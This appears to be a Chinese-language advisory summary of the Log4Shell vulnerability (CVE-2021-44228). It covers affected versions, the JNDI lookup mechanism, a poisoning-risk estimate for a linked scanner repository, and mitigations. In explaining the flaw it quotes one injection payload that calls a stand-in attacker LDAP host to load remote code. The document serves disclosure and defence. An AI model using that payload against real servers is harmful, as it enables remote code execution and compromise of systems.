## CVE-2021-44228 - Apache Log4j2 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是一个严重的远程代码执行漏洞，存在于 Apache Log4j2 中。攻击者可以通过构造包含 JNDI 查找的恶意日志消息，从而在目标服务器上执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** Log4j2 允许在日志消息中使用 JNDI 查找，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 尝试解析这些查找时，它会连接到指定的 JNDI 服务器（例如 LDAP），并检索 Java 对象。如果攻击者可以控制日志消息的内容，他们就可以让 Log4j2 连接到恶意的 JNDI 服务器，该服务器会返回包含恶意代码的 Java 对象，Log4j2 反序列化这个对象从而导致任意代码执行。

2.  **利用方式：**
    *   攻击者需要找到一个途径，可以将恶意 JNDI 查找字符串注入到应用程序的日志消息中。这可能通过 HTTP 请求头、POST 请求参数、Websocket 消息等实现。
    *   攻击者控制的 JNDI 服务器（例如 LDAP 服务器）需要返回一个包含恶意代码的 Java 对象。这通常通过一个恶意的 Java 类来实现，该类在加载时执行任意代码。

3.  **漏洞代码评估：** 提供的漏洞利用代码看起来像一个通用的漏洞扫描器，可以扫描各种协议，并允许自定义 payload。它本身不包含直接的攻击载荷,但是如果扫描器被用于发送恶意 JNDI 查找字符串，则它就可以被用来触发 CVE-2021-44228。

4.  **投毒风险分析：** 虽然提供的CHANGELOG和LICENSE文件看起来无害，但仓库中其他未提供代码的可能性也存在。扫描器本身允许自定义payload，可能包含恶意软件，用户应该小心使用，因此存在一定的投毒风险（估计为 10%）。这个百分比考虑了代码扫描器可能被用来传播恶意 payload的可能性，即使其核心功能并非恶意。

5.  **缓解措施：**
    *   升级 Log4j2 到 >=2.17.1 版本。
    *   禁用 JNDI 查找功能（如果不需要）。
    *   设置 `log4j2.formatMsgNoLookups=true` 属性。


**项目地址:** [0xInfection/LogMePwn](https://github.com/0xInfection/LogMePwn)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)